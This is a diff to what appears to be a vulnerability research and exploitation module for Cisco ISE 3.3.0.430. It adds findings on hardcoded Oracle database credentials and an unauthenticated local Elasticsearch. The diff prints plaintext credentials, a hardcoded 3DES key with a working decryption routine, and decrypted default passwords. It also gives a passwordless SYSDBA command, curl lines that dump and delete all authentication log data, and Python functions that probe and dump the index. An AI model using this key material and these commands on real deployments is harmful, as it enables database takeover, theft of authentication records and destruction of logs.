@@ -25,7 +25,7 @@ Application stack:
 === FINDINGS (ISE 3.3.0.430, confirmed 2026-08-25) ===
 
 ISE-F1: key_manager decrypt oracle — unauth ciphertext decryption via UNIX socket [CRITICAL]
-ISE-F2: Hardcoded 3DES key -> static Oracle DB credential [HIGH]
+ISE-F2: Hardcoded 3DES key -> static Oracle DB credential — decrypts all default-state creds [CRITICAL]
 ISE-F3: Tomcat manager — empty-password account [HIGH]
 ISE-F4: Hardcoded Tomcat shutdown secret [LOW]
 ISE-F5: TLSv1/TLSv1.1 enabled on ERS port 8906 [MEDIUM]
@@ -43,6 +43,8 @@ ISE-F16: CA Tomcat hardcoded manager:password in tomcat-users.xml (port 9444) [C
 ISE-F17: CA Tomcat default SHUTDOWN secret on port 8105 [LOW]
 ISE-F18: CA REST API / OCSP responder running plain HTTP (ports 9444, 2560) [HIGH]
 ISE-F19: CA NSS DB plaintext password window — ca_nssdb_password.txt no chmod before encryption [HIGH]
+ISE-F20: SQL schema hardcoded Oracle creds — Mali:Mali (plaintext PIP) + handleruser:mohammal (3DES) [CRITICAL]
+ISE-F21: Elasticsearch 6.8.12 on localhost:9200, no auth, no TLS — ISE MNT auth/RADIUS logs [MEDIUM]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -547,6 +549,77 @@ Allows TLS 1.0/1.1 handshake. Enables:
   - Protocol downgrade to 1.0 if client and server both support it
 
 clientAuth="want" means client cert is requested but not required -> optional mTLS.
+
+=== ISE-F20: SQL schema hardcoded Oracle credentials ===
+
+Source: CSCOcpm-db-3.3.0-430.x86_64.rpm
+File:   /opt/CSCOcpm/db/sql/CreateCpmTables.sql
+
+Two distinct Oracle credential paths hardcoded in the shipped DB schema:
+
+1) Mali:Mali — plaintext PIP credential
+   Table: SEC_PIP_MASTER (Policy Information Point)
+   INSERT: SEC_PIP_NAME='Entitlement Repository'
+     SEC_PIP_PROP = '<pip source-type="database">
+       <property name="url">jdbc:oracle:thin:@localhost:1521:cpm10</property>
+       <property name="username">Mali</property>
+       <property name="password">Mali</property>'
+
+   The Oracle connection credential for the ISE PIP database connector is stored
+   PLAINTEXT in the SQL schema. If the Mali Oracle user exists in cpm10, any attacker
+   who reads this SQL file has the credential. Shipped in the ISO, not generated at install.
+
+2) handleruser:mohammal — 3DES-encrypted handler credential (decrypted with ISE-F2 key)
+   Table: SEC_HANDLER_PROPERTIES (PAP Post-hook Handlers)
+   Handlers: UserHandler, GroupHandler, RoleHandler, UserGroupMappingHandler, ParentGroupHandler,
+             EntitlementAttributeHandler, SecretsHandler (7 total, all same password)
+   INSERT: username='handleruser', password='1GOnYUy8rmREq6iEZjvEnQ==', SEC_IS_ENCRYPT='True'
+
+   Decryption (ISE-F2 key):
+     DES3.new(b'ASDF asdf 1234 8983 jkla', DES3.MODE_ECB).decrypt(
+       b64decode('1GOnYUy8rmREq6iEZjvEnQ=='))[:-5]
+     = b'mohammal'
+
+   Connection: jdbc:oracle:thin:@localhost:1521:cpm10
+   Oracle user: handleruser, password: mohammal
+
+Both credentials authenticate to the Oracle cpm10 DB. Combined with Oracle port 1521
+being accessible from within ISE (local + mnthost): any foothold = DB access.
+
+Additionally confirmed in initcpm10.ora:
+  os_authent_prefix=''  (OS auth enabled, empty prefix)
+  audit_trail='NONE'    (no Oracle audit logging)
+  remote_os_authent=FALSE (local-only OS auth)
+
+Oracle OS auth path (as oracle OS user, no password required):
+  su - oracle -c "sqlplus -s /@system10 as sysdba"
+  -> SYSDBA access, no credential needed, no audit trail
+
+=== ISE-F21: Elasticsearch 6.8.12 localhost:9200, no auth ===
+
+Source: CSCOcpm-elasticsearch-3.3.0-430.x86_64.rpm
+Files:  /opt/CSCOcpm/elasticsearch-6.8.12/config/elasticsearch.yml
+        /opt/CSCOcpm/bin/elasticsearch-control.sh
+
+Elasticsearch 6.8.12 on ISE MNT (Monitoring & Troubleshooting) node:
+  Port:     9200 (HTTP, NOT HTTPS — HTTP="HTTP" in control script)
+  Binding:  localhost (default ES behavior, control script uses localhost:$ES_PORT)
+  Auth:     None (x-pack.security.enabled not configured; default=false in 6.x)
+  TLS:      None
+
+Data stored: ISE authentication logs, RADIUS accounting records, endpoint profiling data,
+             syslog events, session monitoring data (the MNT node's entire log archive).
+
+From any local process (ISE-F1 chain or other local code exec):
+  curl http://localhost:9200/_cat/indices                    # list all indices
+  curl http://localhost:9200/_search?pretty&size=100         # dump all records
+  curl -XDELETE http://localhost:9200/_all                   # delete all ISE log data
+
+  Also confirmed: control script uses DELETE /_all for maintenance:
+    HTTP_STAT=$( curl -m 50 -I -k -XDELETE $HTTP://localhost:$ES_PORT/_all ... )
+
+Impact: MNT node breach = complete ISE authentication history exfiltration.
+All RADIUS auths, 802.1X logs, guest access records, posture events, profiling data.
 
 === ISE-F16: CA Tomcat hardcoded manager:password ===
 
@@ -1537,21 +1610,113 @@ def check_nssdb_plaintext_exposed(
     }
 
 
+# ---------------------------------------------------------------------------
+# ISE-F20: Schema hardcoded Oracle creds
+# ---------------------------------------------------------------------------
+
+ISE_ORACLE_SCHEMA_CREDS = {
+    "pip_user": "Mali",
+    "pip_pass": "Mali",
+    "pip_source": "CreateCpmTables.sql / SEC_PIP_MASTER",
+    "handler_user": "handleruser",
+    "handler_pass_encrypted": "1GOnYUy8rmREq6iEZjvEnQ==",
+    "handler_pass_plaintext": "mohammal",
+    "handler_source": "CreateCpmTables.sql / SEC_HANDLER_PROPERTIES",
+    "oracle_url": "jdbc:oracle:thin:@localhost:1521:cpm10",
+}
+
+
+def decrypt_ise_handler_password(ct_b64: str = "1GOnYUy8rmREq6iEZjvEnQ==",
+                                  key: bytes = DEFAULT_ENCRYPT_KEY) -> str:
+    """
+    Decrypt ISE SEC_HANDLER_PROPERTIES password using ISE-F2 3DES key.
+
+    CreateCpmTables.sql stores handleruser password as:
+      '1GOnYUy8rmREq6iEZjvEnQ==' (SEC_IS_ENCRYPT='True')
+    Decrypts to: 'mohammal'
+
+    Same key, same mechanism as ISE-F2 (DefaultCryptEncryptor, DESede/ECB).
+    """
+    return decrypt_legacy_ise_db_password(ct_b64, key)
+
+
+# ---------------------------------------------------------------------------
+# ISE-F21: Elasticsearch localhost:9200 unauthenticated
+# ---------------------------------------------------------------------------
+
+ES_HOST = "localhost"
+ES_PORT = 9200
+
+
+def probe_elasticsearch_localhost(host: str = ES_HOST, port: int = ES_PORT) -> Optional[dict]:
+    """
+    GET http://localhost:9200/ — Elasticsearch 6.8.12 root endpoint, no auth required.
+    Returns cluster info dict, or None if unreachable.
+
+    ISE MNT node runs ES on localhost:9200 (plain HTTP, no x-pack.security).
+    Contains RADIUS auth logs, 802.1X events, profiling data, session records.
+
+    Equivalent:
+      curl http://localhost:9200/
+    """
+    import urllib.request
+    import json
+
+    try:
+        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=10) as resp:
+            return json.loads(resp.read().decode())
+    except Exception:
+        return None
+
+
+def dump_elasticsearch_index(index: str = "_all", host: str = ES_HOST,
+                              port: int = ES_PORT, size: int = 100) -> Optional[dict]:
+    """
+    GET http://localhost:9200/<index>/_search?size=<n> — unauth ES data dump.
+    Returns search results dict with ISE log entries, or None on failure.
+
+    Use index="_all" for all indices, or specific names like "ise_radius_auth".
+
+    Equivalent:
+      curl 'http://localhost:9200/_all/_search?pretty&size=100'
+    """
+    import urllib.request
+    import json
+
+    url = f"http://{host}:{port}/{index}/_search?pretty&size={size}"
+    try:
+        with urllib.request.urlopen(url, timeout=30) as resp:
+            return json.loads(resp.read().decode())
+    except Exception:
+        return None
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.7.0",
+    "version": "1.8.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
         "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
         "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
+        "ISE-F20", "ISE-F21",
     ],
-    "critical": ["ISE-F1", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16"],
-    "high": ["ISE-F2", "ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19"],
-    "medium": ["ISE-F5", "ISE-F8", "ISE-F14"],
+    "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20"],
+    "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19"],
+    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21"],
     "low": ["ISE-F4", "ISE-F17"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
+    "key_material": {
+        "ise_f2_3des_key": "ASDF asdf 1234 8983 jkla",
+        "ise_f2_3des_key_hex": "41534446206173646620313233342038393833206a6b6c61",
+        "ise_f2_default_oracle_pw_ct": "pTZv2LEjfGPX5YICzJb95g==",
+        "ise_f2_default_oracle_pw_pt": "U0l1_6v#k3c",
+        "ise_f20_handler_pw_ct": "1GOnYUy8rmREq6iEZjvEnQ==",
+        "ise_f20_handler_pw_pt": "mohammal",
+        "ise_f20_pip_user": "Mali",
+        "ise_f20_pip_pw": "Mali",
+    },
     "primitives": [
         "decrypt_legacy_ise_db_password",
         "decrypt_ise_db_password_from_kek",
@@ -1581,5 +1746,7 @@ MODULE_META = {
         "probe_ca_ocsp_responder",
         "read_ca_nssdb_password",
         "check_nssdb_plaintext_exposed",
+        "probe_elasticsearch_localhost",
+        "dump_elasticsearch_index",
     ],
 }
